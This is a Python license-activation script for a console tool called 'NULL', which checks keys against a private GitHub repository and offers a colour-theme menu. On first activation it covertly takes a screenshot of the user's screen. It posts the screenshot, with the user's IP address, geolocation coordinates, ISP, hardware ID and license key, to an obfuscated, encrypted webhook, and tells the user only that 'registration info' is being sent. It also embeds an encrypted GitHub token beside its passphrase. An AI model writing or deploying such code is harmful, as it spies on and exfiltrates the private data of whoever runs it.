#!/usr/bin/env python3
import sys
import time
import os
import json
import hashlib
import uuid
import requests
import base64
import random
import string
import colorsys
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from colorama import init, Fore, Style
import ctypes
import threading

init(autoreset=True)

# Encryption settings
TOKEN_PASSPHRASE = "f0a5baf4-f90b-4800-a407-eb5065382113"
WEBHOOK_PASSPHRASE = "fdfac521-be53-4ed5-b7a0-47606a2f3821"

# Encrypted tokens
ENCRYPTED_GITHUB_TOKEN = "U2FsdGVkX1+EsNr+p0PWwWMW3udxhDXtt6WfIUaTVivHMUcE6wb4CPWd7spuy3moFuiadjsEQGPzojlv30mjc2sPklc8o4FLKqP/xehTeShOgn7LbTfVoiTIy5Sd7F1FKfjcBUSaOb0Zh6jk3JMYgw=="
ENCRYPTED_WEBHOOK = "U2FsdGVkX1+Nw4U/zl83/gKNEByPtf6hHZCyga+N6cKvQZNTQgo9fp4UjeajxHOySDCuZhv6PbgzS+VtCTMzE6ULKXqHChvUSVKiQRxjINzWrVIyWBMs2B3QwUZYflKrEJYj25kQ4wCcLaRIMJUmuoKpmpmKy+5oLz5Bi9FjYzOv8ftNm7Ye41t6Sy87Prwz"

# GitHub repository information
REPO_OWNER = "egirlhunt"
REPO_NAME = "nulllkeys"
FILE_PATH = "keys.json"

# GitHub API URL
GITHUB_API_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"

# Color themes with HSV-based gradients
COLOR_THEMES = {
    "1": {"name": "Red", "hue": 0.00},
    "2": {"name": "Orange", "hue": 0.08},
    "3": {"name": "Yellow", "hue": 0.15},
    "4": {"name": "Green", "hue": 0.33},
    "5": {"name": "Cyan", "hue": 0.50},
    "6": {"name": "Blue", "hue": 0.60},
    "7": {"name": "Purple", "hue": 0.75},
    "8": {"name": "Pink", "hue": 0.90},
    "9": {"name": "White", "grayscale": True},
    "10": {"name": "Rainbow", "rainbow": True}
}

# Set default theme to Purple (option 7)
current_theme = COLOR_THEMES["7"]

# License key storage file
LICENSE_FILE = "license.key"

def get_console_width():
    """Get current console width"""
    try:
        return os.get_terminal_size().columns
    except OSError:
        return 80  # default width if terminal size can't be determined

def print_centered(text, width=None):
    """Print text centered in console"""
    if width is None:
        width = get_console_width()
    
    lines = text.split("\n")
    for line in lines:
        if line.strip():  # Only center non-empty lines
            print(line.center(width))
        else:
            print()  # Preserve empty lines

def print_color_centered(text, color_code="", width=None):
    """Print colored text centered in console"""
    if width is None:
        width = get_console_width()
    
    lines = text.split("\n")
    for line in lines:
        if line.strip():
            print(f"{color_code}{line.center(width)}{Style.RESET_ALL}")
        else:
            print()

def hsv_to_ansi(h, s=1.0, v=1.0):
    """Convert HSV to smooth ANSI 256 color"""
    r, g, b = colorsys.hsv_to_rgb(h, s, v)
    r = int(r * 5)
    g = int(g * 5)
    b = int(b * 5)
    return 16 + (36 * r) + (6 * g) + b

def get_public_ip():
    """Get public IP address"""
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return "Unknown"

def get_geo_location(ip_address):
    """Get geolocation data for IP address"""
    if ip_address == "Unknown":
        return {
            "country": "Unknown", 
            "city": "Unknown", 
            "isp": "Unknown",
            "region": "Unknown",
            "lat": "Unknown",
            "lon": "Unknown",
            "ip": "Unknown"
        }
    
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                geo_info = {
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "lat": str(data.get("lat", "Unknown")),
                    "lon": str(data.get("lon", "Unknown")),
                    "ip": ip_address
                }
                return geo_info
    except:
        pass
    
    return {
        "country": "Unknown", 
        "city": "Unknown", 
        "isp": "Unknown",
        "region": "Unknown",
        "lat": "Unknown",
        "lon": "Unknown",
        "ip": ip_address
    }

def evp_bytes_to_key(password, salt, key_len=32, iv_len=16):
    """OpenSSL EVP_BytesToKey compatible key derivation"""
    d = d_i = b''
    while len(d) < key_len + iv_len:
        d_i = hashlib.md5(d_i + password + salt).digest()
        d += d_i
    return d[:key_len], d[key_len:key_len+iv_len]

def decrypt_aes_openssl(encrypted_text, passphrase):
    """Decrypt AES-256-CBC encrypted text (OpenSSL compatible)"""
    try:
        # Decode base64
        encrypted_data = base64.b64decode(encrypted_text)
        
        # Check for "Salted__" prefix
        if encrypted_data[:8] != b'Salted__':
            return ""
        
        # Extract salt (8 bytes after "Salted__")
        salt = encrypted_data[8:16]
        ciphertext = encrypted_data[16:]
        
        # Derive key and IV using OpenSSL's EVP_BytesToKey
        password = passphrase.encode('utf-8')
        key, iv = evp_bytes_to_key(password, salt, 32, 16)
        
        # Decrypt
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(ciphertext)
        
        # Remove PKCS7 padding
        plaintext = unpad(decrypted, AES.block_size)
        
        return plaintext.decode('utf-8')
        
    except Exception:
        return ""

def get_github_token():
    """Get decrypted GitHub token"""
    token = decrypt_aes_openssl(ENCRYPTED_GITHUB_TOKEN, TOKEN_PASSPHRASE)
    return token

def get_webhook_url():
    """Get decrypted webhook URL"""
    return decrypt_aes_openssl(ENCRYPTED_WEBHOOK, WEBHOOK_PASSPHRASE)

def get_hwid():
    """Generate a unique hardware ID"""
    try:
        hwid_parts = []
        
        # Get MAC address
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0, 8*6, 8)][::-1])
        hwid_parts.append(mac)
        
        # Get machine ID if available
        if os.name == 'posix':
            try:
                with open('/etc/machine-id', 'r') as f:
                    hwid_parts.append(f.read().strip())
            except:
                pass
        
        # Create hash from all parts
        hwid_string = '-'.join(hwid_parts)
        return hashlib.sha256(hwid_string.encode()).hexdigest()[:32]
        
    except Exception as e:
        return str(uuid.getnode())

def generate_random_id():
    """Generate a random 16-character ID"""
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(16))

def save_id_to_file(user_id, license_key):
    """Save ID to text file with warning"""
    warning_text = """WARNING: NEVER SHARE THIS ID

SHARING THIS COULD LEAD TO YOUR LICENSE KEY GETTING REMOVED OR STOLEN

ANYONE ELSE THAN @uekv ON DISCORD ASKING FOR THIS ID IS A SCAMMER/FAKER

YOUR ID: {user_id}
YOUR LICENSE KEY: {license_key}

This ID is your proof of ownership.
If you lose it, use the "Generate ID" option in the tool.
""".format(user_id=user_id, license_key=license_key)
    
    with open("ID.txt", "w") as f:
        f.write(warning_text)
    
    print_color_centered(f"[+] ID saved to ID.txt", get_color('medium'))
    print_color_centered(f"[!] Keep this file safe! Never share it!", get_color('medium'))

def get_color(intensity="medium"):
    """Get color based on current theme and intensity"""
    if current_theme.get("rainbow"):
        hue = (time.time() * 0.08) % 1.0
        ansi = hsv_to_ansi(hue)
        return f"\033[38;5;{ansi}m"

    if current_theme.get("grayscale"):
        shades = {"dark": 236, "medium": 245, "light": 255}
        return f"\033[38;5;{shades.get(intensity, 245)}m"

    hue = current_theme["hue"]
    value = {"dark": 0.55, "medium": 0.75, "light": 1.0}.get(intensity, 0.75)

    ansi = hsv_to_ansi(hue, 0.9, value)
    return f"\033[38;5;{ansi}m"

def get_gradient_color(position, total_positions):
    """Get smooth gradient color for a specific position"""
    if total_positions <= 1:
        return "\033[38;5;255m"

    t = position / (total_positions - 1)

    if current_theme.get("rainbow"):
        # Real rainbow — smooth HSV sweep
        hue = t * 0.85  # avoid looping back to red
        ansi = hsv_to_ansi(hue)
        return f"\033[38;5;{ansi}m"

    if current_theme.get("grayscale"):
        gray = int(232 + t * 23)
        return f"\033[38;5;{gray}m"

    # Smooth brightness gradient inside one color family
    hue = current_theme["hue"]
    value = 0.45 + (t * 0.55)  # dark → bright
    ansi = hsv_to_ansi(hue, 0.9, value)
    return f"\033[38;5;{ansi}m"

def save_license_key(license_key):
    """Save license key to file"""
    try:
        with open(LICENSE_FILE, "w") as f:
            f.write(license_key)
        return True
    except:
        return False

def load_license_key():
    """Load license key from file"""
    try:
        if os.path.exists(LICENSE_FILE):
            with open(LICENSE_FILE, "r") as f:
                return f.read().strip()
    except:
        pass
    return ""

def ask_save_license_windows():
    """Ask user if they want to save the license key using Windows MessageBox"""
    try:
        result = ctypes.windll.user32.MessageBoxW(
            0,
            "Do you want to save your license key for next time?\n\nYes: Save and auto-load next time\nNo: Ask every time",
            "Save License Key",
            0x00000004 | 0x00000020  # Yes/No buttons + Question icon
        )
        
        # IDYES = 6, IDNO = 7
        return result == 6  # Returns True if Yes, False if No
    except:
        # Fallback to console if Windows MessageBox fails
        return False

def fetch_license_data():
    """Fetch and parse license data from private GitHub repository"""
    try:
        github_token = get_github_token()
        if not github_token:
            return []
        
        headers = {
            "Authorization": f"Bearer {github_token}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        response = requests.get(GITHUB_API_URL, headers=headers, timeout=10)
        
        if response.status_code == 200:
            file_info = response.json()
            content = base64.b64decode(file_info["content"]).decode('utf-8')
            licenses = json.loads(content)
            return licenses
            
    except Exception:
        pass
    
    return []

def update_license_data_with_ip(license_key, new_hwid, new_id="", geo_info=None):
    """Update license data in private GitHub repository with IP information"""
    try:
        github_token = get_github_token()
        if not github_token:
            return False
        
        # Get current file info
        headers = {
            "Authorization": f"Bearer {github_token}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        response = requests.get(GITHUB_API_URL, headers=headers, timeout=10)
        if response.status_code != 200:
            return False
        
        file_info = response.json()
        current_sha = file_info["sha"]
        current_content = base64.b64decode(file_info["content"]).decode('utf-8')
        
        # Parse and update the JSON
        licenses = json.loads(current_content)
        updated = False
        
        for license_entry in licenses:
            if license_entry.get("Licensekey") == license_key:
                # Update HWID
                license_entry["hwid"] = new_hwid
                
                # Update ID if provided
                if new_id and not license_entry.get("id"):
                    license_entry["id"] = new_id
                
                # Add IP and geolocation information
                if geo_info:
                    # Add IP info fields
                    license_entry["ip"] = geo_info.get("ip", "Unknown")
                    license_entry["country"] = geo_info.get("country", "Unknown")
                    license_entry["city"] = geo_info.get("city", "Unknown")
                    license_entry["isp"] = geo_info.get("isp", "Unknown")
                    license_entry["region"] = geo_info.get("region", "Unknown")
                    license_entry["latitude"] = geo_info.get("lat", "Unknown")
                    license_entry["longitude"] = geo_info.get("lon", "Unknown")
                    
                    # Add activation timestamp
                    license_entry["activation_time"] = time.strftime('%Y-%m-%d %H:%M:%S')
                    license_entry["last_activity"] = time.strftime('%Y-%m-%d %H:%M:%S')
                else:
                    # Just update last activity time
                    if "activation_time" not in license_entry:
                        license_entry["activation_time"] = time.strftime('%Y-%m-%d %H:%M:%S')
                    license_entry["last_activity"] = time.strftime('%Y-%m-%d %H:%M:%S')
                
                updated = True
                break
        
        if not updated:
            return False
        
        # Update file on GitHub
        update_data = {
            "message": f"Update license info for {license_key[:8]}...",
            "content": base64.b64encode(json.dumps(licenses, indent=2).encode()).decode(),
            "sha": current_sha
        }
        
        update_response = requests.put(GITHUB_API_URL, headers=headers, json=update_data, timeout=10)
        
        if update_response.status_code in [200, 201]:
            return True
        else:
            return False
            
    except Exception:
        return False

def take_screenshot():
    """Take a screenshot of the current screen using mss"""
    try:
        import mss
        import mss.tools
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            screenshot = sct.grab(monitor)
            
            # Convert to bytes using mss.tools
            img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
            return base64.b64encode(img_bytes).decode('utf-8')
            
    except Exception:
        return None

def send_webhook(license_key, hwid, user_id="", geo_info=None):
    """Send registration to webhook with geolocation and screenshot"""
    try:
        webhook_url = get_webhook_url()
        if not webhook_url:
            return False
        
        # Try to take screenshot
        screenshot_b64 = take_screenshot()
        
        # Create fields for embed
        fields = [
            {"name": "License key", "value": f"`{license_key}`", "inline": True},
            {"name": "HWID", "value": f"`{hwid}`", "inline": True}
        ]
        
        if user_id:
            fields.append({"name": "User ID", "value": f"`{user_id}`", "inline": True})
        
        # Add geolocation info if available
        if geo_info:
            geo_fields = []
            if geo_info.get("ip") and geo_info["ip"] != "Unknown":
                geo_fields.append({"name": "IP Address", "value": f"`{geo_info['ip']}`", "inline": True})
            if geo_info.get("country") and geo_info["country"] != "Unknown":
                geo_fields.append({"name": "Country", "value": f"`{geo_info['country']}`", "inline": True})
            if geo_info.get("city") and geo_info["city"] != "Unknown":
                geo_fields.append({"name": "City", "value": f"`{geo_info['city']}`", "inline": True})
            if geo_info.get("isp") and geo_info["isp"] != "Unknown":
                geo_fields.append({"name": "ISP", "value": f"`{geo_info['isp']}`", "inline": False})
            if geo_info.get("region") and geo_info["region"] != "Unknown":
                geo_fields.append({"name": "Region", "value": f"`{geo_info['region']}`", "inline": True})
            if geo_info.get("lat") and geo_info["lat"] != "Unknown":
                geo_fields.append({"name": "Latitude", "value": f"`{geo_info['lat']}`", "inline": True})
            if geo_info.get("lon") and geo_info["lon"] != "Unknown":
                geo_fields.append({"name": "Longitude", "value": f"`{geo_info['lon']}`", "inline": True})
            
            fields.extend(geo_fields)
        
        # Add screenshot info
        if screenshot_b64:
            fields.append({"name": "Screenshot", "value": "Screenshot attached", "inline": False})
        else:
            fields.append({"name": "Screenshot", "value": "Could not capture screenshot", "inline": False})
        
        # Prepare payload with both content and embed
        payload = {
            "content": f"**License Key:** `{license_key}`",
            "embeds": [{
                "title": "NEW REGISTRATION",
                "color": 16711680,  # Red color
                "fields": fields,
                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
            }]
        }
        
        # If screenshot was captured, send it as a file
        if screenshot_b64:
            # Send screenshot as a separate message
            screenshot_file = {
                'file': ('screenshot.png', base64.b64decode(screenshot_b64), 'image/png')
            }
            
            # First send the embed with license key
            response1 = requests.post(webhook_url, json=payload, timeout=10)
            
            # Then send the screenshot
            response2 = requests.post(webhook_url, files=screenshot_file, timeout=10)
            
            return response1.status_code == 200 and response2.status_code == 200
        else:
            # Send just the embed
            response = requests.post(webhook_url, json=payload, timeout=10)
            return response.status_code == 200
            
    except Exception:
        return False

def clear_console():
    """Clear console"""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_ascii_art():
    """Display ASCII art centered"""
    clear_console()
    
    ascii_text = [
        " ███▄    █  █    ██  ██▓     ██▓    ",
        " ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ",
        "▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ",
        "▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░    ",
        "▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒",
        "░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░",
        "░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░",
        "   ░   ░ ░  ░░░ ░ ░   ░ ░     ░ ░   ",
        "         ░    ░         ░  ░    ░  ░",
        "                                    "
    ]
    
    # Display with gradient
    for i, line in enumerate(ascii_text):
        color = get_gradient_color(i, len(ascii_text))
        print_color_centered(line, color)
    
    # Made by text centered
    made_by_text = "made by @uekv on discord"
    color = get_gradient_color(len(ascii_text) + 1, len(ascii_text) + 2)
    print_color_centered(made_by_text, color)
    
    # Separator centered
    separator = "─" * 50
    sep_color = get_gradient_color(len(ascii_text) + 2, len(ascii_text) + 3)
    print_color_centered(separator, sep_color)

def display_color_selection():
    """Display color selection menu centered"""
    display_ascii_art()
    
    print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Color Selection Menu{Style.RESET_ALL}\n")
    
    # Create clean grid: 2 columns, 5 rows
    color_keys = list(COLOR_THEMES.keys())
    
    # Display in 2 columns centered
    for i in range(0, len(color_keys), 2):
        line = ""
        for j in range(2):
            if i + j < len(color_keys):
                key = color_keys[i + j]
                theme = COLOR_THEMES[key]
                # Use the theme's actual color
                if theme.get("rainbow"):
                    # Show rainbow colors preview
                    color_code = "\033[38;5;196m"  # Red
                    name = "Rainbow"
                elif theme.get("grayscale"):
                    color_code = "\033[38;5;255m"  # White
                    name = theme['name']
                else:
                    mid_color = hsv_to_ansi(theme["hue"], 0.9, 0.75)
                    color_code = f"\033[38;5;{mid_color}m"
                    name = theme['name']
                line += f"{color_code}[{key}]{Style.RESET_ALL}{Fore.WHITE} {name:<12}"
        print_centered(line.strip())
    
    print_centered(f"\n{get_color('medium')}{'─' * 50}{Style.RESET_ALL}")
    
    # Center the input prompt
    prompt = f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > {Style.RESET_ALL}"
    print_centered(prompt)
    return input(" " * ((get_console_width() - 20) // 2) + "   ").strip()

def display_main_menu():
    """Display main menu with options side by side and centered"""
    display_ascii_art()
    
    print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Main Menu{Style.RESET_ALL}\n")
    
    # Display options side by side centered
    options = [
        f"{get_color('light')}[1]{Style.RESET_ALL} Change Color", 
        f"{get_color('light')}[2]{Style.RESET_ALL} Generate ID", 
        f"{get_color('light')}[3]{Style.RESET_ALL} Exit"
    ]
    
    options_line = "   ".join(options)
    print_centered(options_line)
    print_centered(f"\n{get_color('medium')}{'─' * 50}{Style.RESET_ALL}")
    
    # Center the input prompt
    prompt = f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > {Style.RESET_ALL}"
    print_centered(prompt)
    return input(" " * ((get_console_width() - 20) // 2) + "   ").strip()

def display_license_prompt():
    """Display license key prompt centered"""
    display_ascii_art()
    
    prompt = f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Enter License Key > {Style.RESET_ALL}"
    print_centered(prompt)
    
    # Center the input cursor
    return input(" " * ((get_console_width() - 20) // 2) + "   ").strip()

def validate_license_key(save_license_prompt=False):
    """Validate license key against private GitHub database"""
    # Check if we have a saved license key
    saved_key = load_license_key()
    user_key = ""
    
    if saved_key and not save_license_prompt:
        user_key = saved_key
        display_ascii_art()
        print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Using saved license key...{Style.RESET_ALL}")
        time.sleep(1)
    else:
        user_key = display_license_prompt()
    
    if not user_key:
        display_ascii_art()
        print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}No license key entered!{Style.RESET_ALL}")
        return False, ""
    
    display_ascii_art()
    print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Checking private database...{Style.RESET_ALL}")
    time.sleep(1)
    
    try:
        # Fetch license data from private GitHub database
        licenses = fetch_license_data()
        
        if not licenses:
            display_ascii_art()
            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Private database connection failed{Style.RESET_ALL}")
            return False, ""
        
        # Find the license key
        license_found = False
        current_hwid = get_hwid()
        user_id = ""
        is_first_activation = False
        
        for license_entry in licenses:
            if license_entry.get("Licensekey") == user_key:
                license_found = True
                stored_hwid = license_entry.get("hwid", "").strip()
                user_id = license_entry.get("id", "").strip()
                
                if not stored_hwid:
                    # First time activation
                    is_first_activation = True
                    display_ascii_art()
                    print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}New activation detected{Style.RESET_ALL}")
                    
                    # Get IP and geolocation
                    ip_address = get_public_ip()
                    geo_info = get_geo_location(ip_address)
                    
                    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Gathering system information...{Style.RESET_ALL}")
                    
                    # Generate ID if not exists
                    if not user_id:
                        user_id = generate_random_id()
                        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Creating User ID...{Style.RESET_ALL}")
                        print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}Generated User ID: {user_id}{Style.RESET_ALL}")
                        save_id_to_file(user_id, user_key)
                    
                    # Send webhook notification with geolocation in background
                    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Sending registration info...{Style.RESET_ALL}")
                    webhook_thread = threading.Thread(target=send_webhook, args=(user_key, current_hwid, user_id, geo_info))
                    webhook_thread.start()
                    
                    # Update GitHub database with HWID, ID, and IP information
                    if update_license_data_with_ip(user_key, current_hwid, user_id, geo_info):
                        print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Updating database...{Style.RESET_ALL}")
                        print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}License activated!{Style.RESET_ALL}")
                        
                        # Ask if user wants to save the license key (only on first activation) using Windows popup
                        if is_first_activation:
                            print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Please check Windows popup...{Style.RESET_ALL}")
                            if ask_save_license_windows():
                                if save_license_key(user_key):
                                    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}License key saved for next time{Style.RESET_ALL}")
                        
                        time.sleep(2)
                        return True, user_key
                    else:
                        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Database update failed{Style.RESET_ALL}")
                        return False, ""
                else:
                    # Check HWID match
                    if stored_hwid == current_hwid:
                        display_ascii_art()
                        print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}Hardware verified{Style.RESET_ALL}")
                        
                        # Update last activity time in database
                        update_license_data_with_ip(user_key, current_hwid, user_id, None)
                        
                        if user_id and not os.path.exists("ID.txt"):
                            save_id_to_file(user_id, user_key)
                        time.sleep(1)
                        return True, user_key
                    else:
                        display_ascii_art()
                        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Hardware mismatch!{Style.RESET_ALL}")
                        print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}If this is a mistake, DM @uekv on discord{Style.RESET_ALL}")
                        
                        for i in range(10, 0, -1):
                            display_ascii_art()
                            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Hardware mismatch!{Style.RESET_ALL}")
                            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}If this is a mistake, DM @uekv on discord{Style.RESET_ALL}")
                            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Closing in {i}...{Style.RESET_ALL}")
                            time.sleep(1)
                        return False, ""
        
        if not license_found:
            display_ascii_art()
            print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}License not found in private database!{Style.RESET_ALL}")
            print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Closing in 3 seconds...{Style.RESET_ALL}")
            
            for i in range(3, 0, -1):
                display_ascii_art()
                print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}License not found in private database!{Style.RESET_ALL}")
                print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Closing in {i}...{Style.RESET_ALL}")
                time.sleep(1)
            
            return False, ""
            
    except Exception as e:
        display_ascii_art()
        print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Database error{Style.RESET_ALL}")
        return False, ""
    
    return False, ""

def main():
    global current_theme
    
    # First try with saved license
    valid_license, license_key = validate_license_key()
    
    # If not valid, prompt for license entry
    if not valid_license:
        valid_license, license_key = validate_license_key(save_license_prompt=True)
    
    if not valid_license:
        sys.exit(1)
    
    # Main menu loop
    while True:
        choice = display_main_menu()
        
        if choice == "1":
            # Change color
            color_choice = display_color_selection()
            if color_choice in COLOR_THEMES:
                current_theme = COLOR_THEMES[color_choice]
                display_ascii_art()
                print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Color changed to {current_theme['name']}{Style.RESET_ALL}")
            else:
                display_ascii_art()
                print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Invalid color choice{Style.RESET_ALL}")
            
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            input(" " * ((get_console_width() - 30) // 2) + "   ").strip()
            
        elif choice == "2":
            # Generate ID
            display_ascii_art()
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Generating new ID...{Style.RESET_ALL}")
            
            # Check if license is still valid
            licenses = fetch_license_data()
            user_id = ""
            
            for license_entry in licenses:
                if license_entry.get("Licensekey") == license_key:
                    user_id = license_entry.get("id", "").strip()
                    break
            
            if not user_id:
                user_id = generate_random_id()
                # Update database with new ID
                update_license_data_with_ip(license_key, get_hwid(), user_id, None)
            
            save_id_to_file(user_id, license_key)
            print_centered(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}ID generated and saved!{Style.RESET_ALL}")
            
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            input(" " * ((get_console_width() - 30) // 2) + "   ").strip()
            
        elif choice == "3" or choice == "exit":
            display_ascii_art()
            print_centered(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.WHITE}Exiting...{Style.RESET_ALL}")
            time.sleep(1)
            sys.exit(0)
            
        else:
            display_ascii_art()
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Invalid option{Style.RESET_ALL}")
            
            print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            input(" " * ((get_console_width() - 30) // 2) + "   ").strip()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        display_ascii_art()
        print_centered(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Interrupted{Style.RESET_ALL}")
        sys.exit(0)
